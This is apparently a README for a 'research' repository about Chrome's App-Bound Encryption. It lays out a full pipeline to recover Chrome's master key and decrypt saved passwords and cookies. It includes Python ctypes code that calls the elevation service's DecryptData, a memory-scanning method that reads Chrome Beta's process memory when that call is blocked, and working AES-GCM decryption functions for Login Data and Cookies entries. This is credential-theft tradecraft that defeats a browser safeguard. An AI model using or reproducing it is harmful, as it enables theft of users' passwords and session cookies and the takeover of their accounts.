# Chrome v157 App-Bound Encryption (ABE) — Research & Decryption

> **Research context:** Chrome 127+ introduced App-Bound Encryption (ABE) to protect stored credentials. This repo documents the internals of flag=3 and flag=4 key blobs, the elevation service protocol, and an alternative recovery path via process memory scanning.

---

## Table of Contents

1. [Background](#background)
2. [Key Blob Format](#key-blob-format)
3. [Flag=3 (Chrome stable, v155)](#flag3-chrome-stable-v155)
4. [Flag=4 (Chrome Beta v157)](#flag4-chrome-beta-v157)
5. [Elevation Service (IElevator)](#elevation-service-ielevator)
6. [Memory Scan Recovery Path](#memory-scan-recovery-path)
7. [Password Blob Format (v20)](#password-blob-format-v20)
8. [Cookie Blob Format (v20 with domain prefix)](#cookie-blob-format-v20-with-domain-prefix)
9. [Decryption — End to End](#decryption--end-to-end)
10. [Files](#files)

---

## Background

Chrome stores the AES-256-GCM master key inside `Local State` at:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
os_crypt.app_bound_encrypted_key
```

The value is base64-encoded. After stripping the first 4 bytes (`APPB` prefix), the remaining blob is an **encrypted key blob** whose structure depends on the **flag byte**.

Each password in `Login Data` is encrypted as a **v20 blob** (see section below) using this master key.

---

## Key Blob Format

```
[4 bytes]  APPB prefix  (stripped before processing)
[1 byte]   flag
[...]      flag-specific payload
```

| Flag | Chrome version | Encryption layer |
|------|---------------|-----------------|
| 1    | < 127         | DPAPI only |
| 2    | 127–129       | DPAPI + AES-256-GCM (IElevator v1) |
| 3    | 130–156       | CNG NCrypt ("Google Chromekey1") + XOR + AES-GCM |
| 4    | 157+          | IElevator v2 only (elevation service opaque blob) |

---

## Flag=3 (Chrome stable, v155)

### Blob layout

```
[1]   flag = 0x03
[32]  encrypted_aes_key    — NCryptDecrypt("Google Chromekey1")
[12]  iv
[32]  ciphertext
[16]  GCM tag
```

Total: 93 bytes after flag.

### Derivation

```python
# 1. Decrypt encrypted_aes_key via Windows CNG
#    Key: "Google Chromekey1" persisted key (DPAPI-protected)
decrypted_key_material = NCryptDecrypt("Google Chromekey1", encrypted_aes_key)

# 2. XOR with a hardcoded 32-byte seed (varies by Chrome build)
intermediate = xor_bytes(decrypted_key_material, XOR_SEED)

# 3. AES-256-GCM final decrypt
master_key = AES_GCM_decrypt(key=intermediate, nonce=iv, ct=ciphertext, tag=tag)
```

After this, `master_key` is 32 bytes and is used directly for v20 password blob decryption.

---

## Flag=4 (Chrome Beta v157)

### Blob layout

```
[1]    flag = 0x04
[137]  opaque blob — only the elevation service can decrypt
```

Total: 138 bytes after APPB prefix.

### Why flag=4 is different

Chrome 157 moved entirely to the **IElevator COM service** for key management. The blob is opaque: there is no documented derivation path. The elevation service (`GoogleChromeBetaElevationService`) calls into Google's internal signing infrastructure and uses a per-machine secret inaccessible from user space.

#### What `DecryptData` does internally

```
elevation_service.exe
  └─ IElevator::DecryptData(encrypted_blob) → master_key
       ├─ Validates caller integrity (signed binary check)
       ├─ Validates caller path matches registered Chrome Beta path
       └─ Decrypts with machine-bound key stored in LSA / TPM
```

Calling `DecryptData` as an untrusted process returns:

```
hr = 0x8004A003  (E_ACCESSDENIED from elevation service)
GetLastError = 5 (ERROR_ACCESS_DENIED)
```

Even with `--elevator-allow-untrusted-path-for-testing` in the service ImagePath, the integrity check blocks external callers on production builds.

---

## Elevation Service (IElevator)

### COM identifiers — Chrome Beta

| Key | Value |
|-----|-------|
| CLSID | `{DD2646BA-3707-4BF8-B9A7-038691A68FC2}` |
| IID | `{B96A14B8-D0B0-44D8-BA68-2385B2A03254}` |

### vtable layout

```
[0]  QueryInterface
[1]  AddRef
[2]  Release
[3]  RunRecoveryAction
[4]  EncryptData
[5]  DecryptData
```

### DecryptData signature (reconstructed)

```c
HRESULT DecryptData(
    IElevator*   pThis,
    BSTR         encrypted_data,   // SysAllocStringByteLen(blob, len)
    BSTR*        decrypted_data,   // output — SysStringByteLen to get size
    DWORD*       last_error        // GetLastError from service side
);
```

### Calling via ctypes (Python)

```python
import ctypes, uuid

ole32    = ctypes.windll.ole32
oleaut32 = ctypes.windll.oleaut32
oleaut32.SysAllocStringByteLen.restype = ctypes.c_void_p

def uuid_to_guid(s):
    return (ctypes.c_uint8 * 16).from_buffer_copy(uuid.UUID(s).bytes_le)

clsid = uuid_to_guid('{DD2646BA-3707-4BF8-B9A7-038691A68FC2}')
iid   = uuid_to_guid('{B96A14B8-D0B0-44D8-BA68-2385B2A03254}')
pUnk  = ctypes.c_void_p()

ole32.CoInitializeEx(None, 0)
hr = ole32.CoCreateInstance(clsid, None, 4, iid, ctypes.byref(pUnk))
# hr == 0x80040154 (REGDB_E_CLASSNOTREG) if service not running
# hr == 0x8004A003 if service rejects the caller

if hr == 0:
    vtbl  = ctypes.cast(ctypes.cast(pUnk, ctypes.POINTER(ctypes.c_void_p))[0],
                        ctypes.POINTER(ctypes.c_void_p))
    DecryptData = ctypes.WINFUNCTYPE(
        ctypes.c_long,
        ctypes.c_void_p, ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_uint32)
    )(vtbl[5])

    bstr_in  = oleaut32.SysAllocStringByteLen(key_blob, len(key_blob))
    bstr_out = ctypes.c_void_p(0)
    last_err = ctypes.c_uint32(0)
    hr2 = DecryptData(pUnk, bstr_in, ctypes.byref(bstr_out), ctypes.byref(last_err))
```

---

## Memory Scan Recovery Path

Because flag=4 blocks external callers, the master key can be recovered from the **Chrome Beta renderer process memory**. Chrome loads the decrypted master key into memory during startup and keeps it for the session lifetime.

### Strategy

```
1. Enumerate processes → find chrome.exe with path containing "Chrome Beta"
   (QueryFullProcessImageNameW distinguishes Beta from stable — both are chrome.exe)

2. OpenProcess(PROCESS_VM_READ, pid)

3. Walk Virtual Address Space with VirtualQueryEx
   - Scan MEM_COMMIT + MEM_PRIVATE + readable regions
   - Skip regions > 8 MB (key is in small heap allocations)

4. ReadProcessMemory → search for candidate 32-byte sequences

5. Validate candidate:
   - Take any v20 password blob from Login Data
   - Try AES-256-GCM decrypt: AES(candidate, nonce=blob[3:15]).decrypt_and_verify(blob[15:-16], blob[-16:])
   - If no exception → candidate IS the master key
```

### Implementation

See [`src/memory_scan.py`](src/memory_scan.py).

---

## Password Blob Format (v20)

All credentials in `Login Data` (SQLite, column `password_value`) are v20 blobs:

```
[3 bytes]  magic = b"v20"
[12 bytes] AES-GCM nonce
[N bytes]  ciphertext   (= plaintext length)
[16 bytes] GCM authentication tag
```

### Decryption

```python
from Crypto.Cipher import AES

def decrypt_v20(master_key: bytes, blob: bytes) -> str:
    assert blob[:3] == b"v20"
    nonce  = blob[3:15]
    ct     = blob[15:-16]
    tag    = blob[-16:]
    pt = AES.new(master_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    return pt.decode("utf-8", errors="replace")
```

---

## Cookie Blob Format (v20 with domain prefix)

Cookies in `Network/Cookies` (SQLite, column `encrypted_value`) use the **same v20 blob format** as passwords, but the decrypted plaintext has an extra 32-byte domain binding context prepended by Chrome before encryption:

```
decrypted_plaintext = [32 bytes domain context] + [actual cookie value string]
```

The 32-byte prefix is deterministic per eTLD+1 — all cookies from the same domain share the same prefix. It appears to be Chrome's internal per-domain key binding and should be discarded.

### Cookie decryption

```python
COOKIE_PREFIX = 32  # bytes to strip from every decrypted cookie

def decrypt_cookie(master_key: bytes, blob: bytes) -> str:
    assert blob[:3] == b"v20"
    nonce  = blob[3:15]
    ct     = blob[15:-16]
    tag    = blob[-16:]
    pt = AES.new(master_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    return pt[COOKIE_PREFIX:].decode("utf-8", errors="replace")
```

See [`src/decrypt_v20.py`](src/decrypt_v20.py) — `ardacan_decrypt(key, blob, strip=32)` for cookies, `strip=0` for passwords.

Full analysis in [`research/cookie_plaintext_format.md`](research/cookie_plaintext_format.md).

---

## Decryption — End to End

```
Local State
  └─ os_crypt.app_bound_encrypted_key
       └─ base64_decode → strip 4-byte prefix → key_blob
            ├─ flag=3: NCrypt("Google Chromekey1") + XOR + AES-GCM → master_key (32 B)
            └─ flag=4: IElevator::DecryptData (blocked externally)
                         └─ fallback: scan chrome.exe (Chrome Beta) memory → master_key

master_key (32 bytes, AES-256-GCM key)
  ├─ Login Data (SQLite)
  │    └─ logins.password_value → v20 blob
  │         └─ AES-256-GCM(master_key, nonce, ct, tag) → plaintext password
  └─ Network/Cookies (SQLite)
       └─ cookies.encrypted_value → v20 blob
            └─ AES-256-GCM(master_key, nonce, ct, tag) → [32 B prefix] + cookie value
```

---

## Files

```
chrome-v157-abe/
├── README.md                       ← this file
├── src/
│   ├── memory_scan.py              ← process memory scanner (finds master key)
│   ├── decrypt_v20.py              ← v20 blob decryption (passwords + cookies)
│   └── read_local_state.py         ← parse Local State, detect flag
└── research/
    ├── blob_format.md              ← detailed byte-level flag=3/4 analysis
    ├── elevator_vtable.md          ← IElevator vtable reconstruction notes
    └── cookie_plaintext_format.md  ← 32-byte domain prefix in cookie plaintexts
```
